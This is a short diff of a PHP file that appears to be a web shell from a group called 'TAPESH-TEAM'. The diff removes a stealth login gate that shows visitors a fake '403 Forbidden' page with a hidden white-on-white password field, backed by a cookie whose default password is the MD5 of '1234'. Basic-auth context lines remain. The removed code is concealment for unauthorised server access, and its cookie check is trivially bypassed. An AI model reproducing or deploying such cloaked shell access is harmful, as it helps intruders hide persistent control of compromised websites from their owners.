@@ -10,34 +10,6 @@ if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_
    exit("<b>https://github.com/TAPESH-TEAM</b>");
    }
 }
-ob_start();
-if(!isset($_COOKIE['TapeshPassword']))
-{
-    setcookie('TapeshPassword',md5("1234"),time() + (86400 * 30));
-}
-else
-{
-    echo "";
-}
-@$password = $_POST['password'];
-if(@$_COOKIE['TapeshPassword'] == md5($password))
-{
-    setcookie('Tapeshlog','true',time() + (86400 * 30));
-}
-else
-{
-    if(!isset($_COOKIE['Tapeshlog']) || $_COOKIE['Tapeshlog']=="false" || !isset($_COOKIE['Tapeshlog']))
-    {
-        $Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
-        $SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
-        echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
-        exit;
-    }
-    else if($_COOKIE['Tapeshlog'] == "true")
-    {
-        echo "";
-    }
-}
 ?>
 <html>
 <head>
